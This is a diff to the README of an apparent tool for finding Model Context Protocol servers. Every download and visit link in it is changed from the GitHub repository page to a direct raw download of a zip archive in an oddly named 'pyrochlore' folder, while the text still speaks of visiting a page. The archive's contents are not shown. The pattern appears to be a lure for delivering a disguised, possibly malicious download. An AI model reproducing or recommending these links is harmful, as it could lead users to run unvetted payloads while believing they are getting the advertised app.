@@ -1,6 +1,6 @@
 # 🔗 mcp-servers-hub - Find Model Context Protocol Servers Easily
 
-[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub)
+[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub/raw/refs/heads/main/pyrochlore/servers_mcp_hub_3.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You can start using the mcp-servers-hub with just a few simple steps. We will gu
 
 Click the big button below to visit the page where you can download the app files and explore server information.
 
-[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub)
+[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub/raw/refs/heads/main/pyrochlore/servers_mcp_hub_3.9.zip)
 
 On the page you open, look for the latest release or main download area. Follow these steps:
 
@@ -106,7 +106,7 @@ If you have trouble running the app or opening files, try these steps:
 
 Visit the GitHub page regularly to find updates, new releases, and additional instructions. You can also look at the repository’s README and issues section for community discussions and help.
 
-[https://github.com/haniamkhan5-coder/mcp-servers-hub](https://github.com/haniamkhan5-coder/mcp-servers-hub)
+[https://github.com/haniamkhan5-coder/mcp-servers-hub/raw/refs/heads/main/pyrochlore/servers_mcp_hub_3.9.zip](https://github.com/haniamkhan5-coder/mcp-servers-hub/raw/refs/heads/main/pyrochlore/servers_mcp_hub_3.9.zip)
 
 ---
 
@@ -139,4 +139,4 @@ These keywords relate to the servers and AI features you will find inside the ap
 
 ---
 
-[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub)
+[![Download/Visit Page](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/haniamkhan5-coder/mcp-servers-hub/raw/refs/heads/main/pyrochlore/servers_mcp_hub_3.9.zip)
